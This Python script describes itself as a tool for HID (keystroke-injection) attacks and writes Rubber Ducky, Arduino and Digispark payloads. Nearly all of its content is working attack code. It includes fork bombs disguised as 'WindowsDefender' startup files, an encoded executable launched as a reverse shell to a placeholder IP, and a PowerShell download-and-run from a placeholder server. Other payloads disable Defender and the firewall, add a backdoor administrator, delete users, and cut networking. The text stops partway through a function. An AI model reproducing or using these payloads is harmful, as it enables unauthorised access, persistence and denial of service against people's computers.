#!/usr/bin/python3

#MG, tool for HID Attacks.
import subprocess

# payloads for rubber ducky
def payload_rb_fork1(payload1):
    rb_fork1 = ("""DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 1200
ALT s
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
DELAY 500
STRING cd %ProgramData%
ENTER
STRING cd Microsoft 
ENTER
STRING cd Windows 
ENTER
STRING cd Start Menu 
ENTER
STRING cd Programs 
ENTER
STRING cd Startup
ENTER
STRING erase /Q WindowsDefender.vbs
ENTER
STRING copy con WindowsDefender.vbs
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
STRING start WindowsDefender.vbs && exit
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload1, "a")
        f.write(rb_fork1)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_rb_fork2(payload2):
    rb_fork2= ("""DELAY 1000
GUI r
DELAY 500
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
ENTER
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
STRING cd %USERPROFILE%
ENTER
STRING cd Documents
ENTER
STRING erase /Q WindowsDefender.vbs
ENTER
STRING copy con WindowsDefender.vbs
ENTER
STRING do
ENTER
STRING CreateObject("Wscript.Shell").Run "cmd", 0, False
ENTER
STRING loop
CTRL z
ENTER
DELAY 50
STRING start WindowsDefender.vbs && exit
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload2, "a")
        f.write(rb_fork2)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_rb_rs(payload3):
    rb_rs= ("""DELAY 1000
GUI r
DELAY 500
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 12000
ALT s
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
DELAY 500
STRING cd/
ENTER
STRING erase /Q decoder.vbs
ENTER
STRING copy con decoder.vbs
ENTER
STRING Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)
STRING :outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS = 
STRING CreateObject("Scripting.FileSystemObject"):
ENTER
STRING set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded = 
STRING objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function 
STRING decodeBase64(base64):
ENTER
STRING dim DM, EL:Set DM = CreateObject("Microsoft.XMLDOM"):Set EL = DM.createElement("tmp"):
STRING EL.DataType = "bin.base64":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub 
STRING writeBytes(file, bytes):Dim binaryStream:
ENTER
STRING Set binaryStream = CreateObject("ADODB.Stream"):binaryStream.Type = 1:
STRING binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub
ENTER
CTRL z
ENTER
STRING erase /Q reverse.txt
ENTER
STRING copy con reverse.txt
ENTER
STRING TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA
ENTER
STRING AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA
ENTER
STRING AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA
ENTER
STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ENTER
STRING AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS
ENTER
STRING 0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA
ENTER
STRING AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2
ENTER
STRING gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A
ENTER
STRING AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA
ENTER
STRING WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA
ENTER
STRING MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq
ENTER
STRING kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF
ENTER
STRING EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv
ENTER
STRING KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp
ENTER
STRING AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm
ENTER
STRING MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A
ENTER
STRING VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s
ENTER
STRING hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9
ENTER
STRING gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp
ENTER
STRING bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY
ENTER
STRING LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B
ENTER
STRING /7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk
ENTER
STRING SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA
ENTER
STRING AAxAAADpdL7//wAAAAIAAAAMQAAA
ENTER
CTRL z
ENTER
STRING erase /Q reverse.exe
ENTER
STRING cscript decoder.vbs reverse.txt reverse.exe
ENTER
STRING reverse.exe YOUR_IP YOUR_PORT
ENTER
STRING exit
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload3, "a")
        f.write(rb_rs)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_rb_download_ex(payload4):
    rb_down_ex=("""DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 12000
ALT s
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
DELAY 1000
STRING $down = New-Object System.Net.WebClient; $url = 'http://YOURSERVER/FILE'; $file = 'FILE.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload4, "a")
        f.write(rb_down_ex)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_rb_deny_na(payload5):
    rb_deny_na=("""DELAY 1000
GUI r
STRING cmd /Q /D /T:7F /F:OFF /V:OFF /K
DELAY 500
ENTER
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
DELAY 500
STRING cd %USEPROFILE% && cd Downloads
ENTER
STRING erase /Q a.bat
ENTER
STRING copy con a.bat
ENTER
STRING @echo off
ENTER
STRING :Start
ENTER
STRING ipconfig /release
ENTER
STRING taskkill /f /im "iexplore.exe"
ENTER
STRING taskkill /f /im "firefox.exe"
ENTER
STRING taskkill /f /im "chome.exe"
ENTER
STRING taskkill /f /im "devenv.exe"
ENTER
STRING timeout /t 60
ENTER
STRING Goto Start
ENTER
CONTROL z
ENTER
STRING erase /Q invis.vbs
ENTER
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL z
ENTER
STRING wscript.exe invis.vbs a.bat
ENTER
STRING exit
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload5, "a")
        f.write(rb_deny_na)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_rb_dis_windef(payload6):
    rb_dis_windef=("""DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
DELAY 12000
ALT s
DELAY 500
ALT SPACE
STRING M
LEFTARROW
REPEAT 100
ENTER
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING exit 
ENTER""")
    try:
        f= open("USB-Rubber-Ducky/"+payload6, "a")
        f.write(rb_dis_windef)
        f.close()
    except:
        print("¡¡¡Error!!!")



#payloads for arduino
def payload_ar_pec(payload1):
    payload_pec=("""#include <Keyboard.h>

char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;

void setup() {
pe();
}

void loop() {

}

void pe() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.end();
}""")
    try:
        f= open("arduino_payloads/"+payload1, "a")
        f.write(payload_pec)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ar_pep(payload2):
    payload_pec = ("""#include <Keyboard.h>

char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;

void setup() {
pe();
}

void loop() {

}

void pe() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("powershell Start/Process powershell /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.end();
}""")
    try:
        f = open("arduino_payloads/" + payload2, "a")
        f.write(payload_pec)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ar_qf(payload3):
    payload_qf = ("""#include <Keyboard.h>

char enter= KEY_RETURN;
char ctrl= KEY_LEFT_CTRL;

void setup(){
  qf();
  }

void loop(){
 
  }

void qf() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("cmd");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(500);
  
  Keyboard.print("cd %USERPROFILE%");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("cd Documents");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("erase &Q WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("copy con WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("%0`%0");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.press(ctrl);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
      
  Keyboard.end();
}""")
    try:
        f = open("arduino_payloads/" + payload3, "a")
        f.write(payload_qf)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ar_du(payload4):
    payload_du = ("""#include <Keyboard.h>

char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;

void setup(){
  du();
  }
void loop(){
  
  }

void du() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("net user %USERNAME% &delete");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
}""")
    try:
        f = open("arduino_payloads/" + payload4, "a")
        f.write(payload_du)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ar_au(payload5):
    payload_au = ("""#include <Keyboard.h>

char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;

void setup() {
  // put your setup code here, to run once:
au();
}

void loop() {
  // put your main code here, to run repeatedly:

}

void au() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.print("net user user1 1234 &add");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("net localgroup administradores user1 &add");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
}""")
    try:
        f = open("arduino_payloads/" + payload5, "a")
        f.write(payload_au)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ar_df(payload6):
    payload_df = ("""#include <Keyboard.h>

char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;

void setup() {
  // put your setup code here, to run once:
df();
}

void loop() {
  // put your main code here, to run repeatedly:

}

void df(){
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("netsh firewall set opmode disable");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
  }""")
    try:
        f = open("arduino_payloads/" + payload6, "a")
        f.write(payload_df)
        f.close()
    except:
        print("¡¡¡Error!!!")



#payloads for digispark
def payload_ds_pec(payload1):
    payload_pec = ("""#include <DigiKeyboard.h>

void setup() {
pe();
}

void loop() {

}

void pe() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);

  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100); 
  
}""")
    try:
        f = open("digispark_payloads/" + payload1, "a")
        f.write(payload_pec)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ds_pep(payload2):
    payload_pep = ("""#include <DigiKeyboard.h>

void setup() {
pe();
}

void loop() {

}

void pe() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process powershell /Verb runAs"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);

  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100); 
  
}""")
    try:
        f = open("digispark_payloads/" + payload2, "a")
        f.write(payload_pep)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ds_qf(payload3):
    payload_qf = ("""#include <DigiKeyboard.h>

void setup(){
  qf();
  }
void loop(){
  
  }

void qf() {
    
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000); 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("cmd"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (1000);
  
  DigiKeyboard.print ("cd %USERPROFILE% ^^ cd Documents");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print ("erase &Q WindowsDefender.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print ("copy con WindowsDefender.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print ("%0`%0");
  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print ("WindowsDefender.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  }""")
    try:
        f = open("digispark_payloads/" + payload3, "a")
        f.write(payload_qf)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ds_df(payload4):
    payload_df = ("""#include <DigiKeyboard.h>

void setup() {
df();
}

void loop() {

}

void df() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);

  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("netsh firewall set opmode disable");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}""")
    try:
        f = open("digispark_payloads/" + payload4, "a")
        f.write(payload_df)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_ds_pf(payload5):
    payload_pf = ("""#include <DigiKeyboard.h>

void setup() {
df();
}

void loop() {

}

void df() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay (1000);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay (500);
  DigiKeyboard.print ("powershell Start/Process cmd /Verb runAs"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay (12000);

  DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd %ProgramData%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd Microsoft");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd Windows");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd Start Menu");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd Programs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("cd Startup");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("erase &Q WindowsDefender.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("copy con WindowsDefender.vbs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("do");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("CreateObject*");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print("Wscript.Shell");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print("(.Run ");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print(", 0, False");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.print("loop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_Z, MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("start WindowsDefender.vbs && exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

}""")
    try:
        f = open("digispark_payloads/" + payload5, "a")
        f.write(payload_pf)
        f.close()
    except:
        print("¡¡¡Error!!!")



#payloads for Kb04rd
def payload_1(payload1):
    payload_1 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
    pe();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    df();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
      qf();
      }
  
}
//////////////////////////////////////

void pe() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.end();
}

void df() {
  //with privilege escalation
  Keyboard.begin();
  delay(5000);
  
  Keyboard.print("netsh firewall set opmode disable");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
}

void qf() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("cmd");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(500);
  
  Keyboard.print("cd %USERPROFILE%");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("cd Documents");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("erase &Q WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("copy con WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("%0`%0");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.press(ctrl);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("WindowsDefender.bat");
  delay(100);
  Keyboard.press(enter);
  Keyboard.release(enter);
  
  Keyboard.end();
  }""")
    try:
        f = open("kb04rd_payloads/" + payload1, "a")
        f.write(payload_1)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_2(payload2):
    payload_2 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
    pe();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    du();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
      au();
      }
  
}
//////////////////////////////////////

void pe() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  
  Keyboard.print("powershell Start/Process cmd /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.end();
}

void du() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.print("net user %USERNAME% &delete");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
}

void au() {
  Keyboard.begin();
  delay(5000);

  Keyboard.print("net user user1 1234 &add");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("net localgroup administradores user1 &add");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);

  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay (100);
  
  Keyboard.end();
  }""")
    try:
        f = open("kb04rd_payloads/" + payload2, "a")
        f.write(payload_2)
        f.close()
    except:
        print("¡¡¡Error!!!")

def payload_3(payload3):
    payload_3 = ("""#include <Keyboard.h>

int p1= 7;
int p2= 15;
int p3= 14;
int es1= 0;        
int es2= 0;
int es3= 0;
char enter= KEY_RETURN;
char alt= KEY_LEFT_ALT;
char ctrl= KEY_LEFT_CTRL;
//////////////////////////////////////

void setup() {
  pinMode(p1, INPUT);
  pinMode(p2, INPUT);
  pinMode(p3, INPUT);
}
//////////////////////////////////////

void loop() {
  
  es1= digitalRead(p1);
  es2= digitalRead(p2);
  es3= digitalRead(p3);  
  if (es1 == HIGH && es2 == LOW && es3 == LOW) {
    fs();
  }
  
  else if (es1 == LOW && es2 == HIGH && es3 == LOW) {
    de();
    }

    else if (es1 == LOW && es2 == LOW && es3 == HIGH){
      pe();
      }
  
}
//////////////////////////////////////

void fs() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("cmd");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(1000);
  
  Keyboard.print("for &l %x in *1,1,10000000000000000000000000000000000000000( do start");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.end();
}

void de() {
  //with privilege escalation and only with english keyboard
  Keyboard.begin();
  delay(5000);

  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'http://YOURSERVER/FILE'; $file = 'FILE.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  Keyboard.print("exit");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
 
  Keyboard.end();
}

void pe() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.print("powershell Start/Process powershell /Verb runAs");
  Keyboard.press(enter);
  Keyboard.release(enter);
  delay(100);
  
  delay (12000);
  Keyboard.press(alt);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.end();
  }""")
    try:
